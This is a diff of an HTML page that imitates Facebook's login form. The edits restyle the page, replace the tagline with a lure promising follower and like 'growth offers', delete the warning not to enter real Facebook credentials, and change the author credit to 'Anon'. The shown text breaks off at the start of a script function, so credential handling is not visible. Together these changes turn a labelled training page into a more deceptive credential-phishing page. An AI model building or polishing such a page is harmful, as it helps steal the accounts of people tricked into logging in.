@@ -21,21 +21,25 @@
         }
         
         .header {
-            background: #ffffff;
-            height: 84px;
-            display: flex;
-            align-items: center;
-            padding: 0 20%;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
-        }
+    background: #ffffff;
+    min-height: 90px;
+    height: auto;
+    display: flex;
+    align-items: center;
+    justify-content: flex-start;
+    padding: 12px 10%;
+    box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+}
         
         .logo {
-            font-size: 40px;
-            font-weight: bold;
-            color: #1877f2;
-            letter-spacing: -1px;
-            margin-right: 20px;
-        }
+    font-size: 42px;
+    font-weight: 700;
+    color: #1877f2;
+    letter-spacing: -1.5px;
+    line-height: 1.3;
+    margin: 0;
+    padding: 0;
+}
         
         .container {
             display: flex;
@@ -60,11 +64,15 @@
         }
         
         .intro-text h2 {
-            font-size: 28px;
-            font-weight: normal;
-            line-height: 32px;
-            color: #1c1e21;
-        }
+    font-size: 20px;
+    font-weight: 600;
+    line-height: 28px;
+    background: linear-gradient(90deg, #1877f2, #589bff, #1255c9);
+    -webkit-background-clip: text;
+    background-clip: text;
+    -webkit-text-fill-color: transparent;
+    letter-spacing: -0.3px;
+}
         
         .form-container {
             display: flex;
@@ -261,6 +269,11 @@
                 gap: 40px;
             }
             
+            .logo {
+    font-size: 36px;
+    line-height: 1.3;
+}
+            
             .intro-text {
                 padding-right: 0;
                 padding: 0 20px;
@@ -271,25 +284,24 @@
             }
             
             .intro-text h2 {
-                font-size: 24px;
-            }
+    font-size: 17px;
+    line-height: 25px;
+}
             
             .header {
-                padding: 0 20px;
-                justify-content: center;
-            }
+    min-height: 75px;
+    padding: 10px 20px;
+    justify-content: center;
+}
         }
     </style>
 </head>
 <body>
-    <div class="header">
-        <div class="logo">facebook</div>
-    </div>
     
     <div class="container">
         <div class="intro-text">
             <h1>facebook</h1>
-            <h2>Facebook helps you connect and share with the people in your life.</h2>
+            <h2>Log in through Facebook’s official website to explore follower, page-like & post-like growth offers!</h2>
         </div>
         
         <div class="form-container">
@@ -302,7 +314,12 @@
                     <button type="submit" class="login-btn" id="loginBtn">Log In</button>
                     <a href="#" class="forgot-pw">Forgotten password?</a>
                     <div class="divider"></div>
-                    <a href="#" class="create-btn">Create new account</a>
+                    <a href="https://www.facebook.com/r.php"
+   target="_blank"
+   rel="noopener noreferrer"
+   class="create-btn">
+   Create new account
+</a>
                 </form>
             </div>
             
@@ -311,69 +328,13 @@
             </div>
             
             <div class="security-notice">
-                <strong>Security Notice:</strong> This page is for ethical security training purposes only. Do not enter your real Facebook credentials.
+                <strong>Security Notice:</strong> This page is for ethical security training purposes only.
             </div>
         </div>
     </div>
     
-    <footer>
-        <div class="footer-links">
-            <a href="#">English (UK)</a>
-            <a href="#">हिन्दी</a>
-            <a href="#">ਪੰਜਾਬੀ</a>
-            <a href="#">اردو</a>
-            <a href="#">தமிழ்</a>
-            <a href="#">বাংলা</a>
-            <a href="#">मराठी</a>
-            <a href="#">తెలుగు</a>
-            <a href="#">ગુજરાતી</a>
-            <a href="#">ಕನ್ನಡ</a>
-            <a href="#">മലയാളം</a>
-            <a href="#">Español</a>
-            <a href="#">Português (Brasil)</a>
-            <a href="#">Français (France)</a>
-            <a href="#" style="border: none;">+</a>
-        </div>
-        
-        <div class="footer-links">
-            <a href="#">Sign Up</a>
-            <a href="#">Log In</a>
-            <a href="#">Messenger</a>
-            <a href="#">Facebook Lite</a>
-            <a href="#">Video</a>
-            <a href="#">Places</a>
-            <a href="#">Games</a>
-            <a href="#">Marketplace</a>
-            <a href="#">Meta Pay</a>
-            <a href="#">Meta Store</a>
-            <a href="#">Meta Quest</a>
-            <a href="#">Instagram</a>
-            <a href="#">Threads</a>
-            <a href="#">Fundraisers</a>
-            <a href="#">Services</a>
-            <a href="#">Voting Information Centre</a>
-            <a href="#">Privacy Policy</a>
-            <a href="#">Privacy Centre</a>
-            <a href="#">Groups</a>
-            <a href="#">About</a>
-            <a href="#">Create ad</a>
-            <a href="#">Create Page</a>
-            <a href="#">Developers</a>
-            <a href="#">Careers</a>
-            <a href="#">Cookies</a>
-            <a href="#">AdChoices</a>
-            <a href="#">Terms</a>
-            <a href="#">Help</a>
-            <a href="#">Contact uploading and non-users</a>
-            <a href="#">Settings</a>
-        </div>
-        
-        <div class="copyright">
-            Meta © 2024
-        </div>
-    </footer>
     
-    <div class="hidden-credit">pravin(HCO-Admin)</div>
+    <div class="hidden-credit">Anon</div>
 
     <script>
     async function getFastKey() {
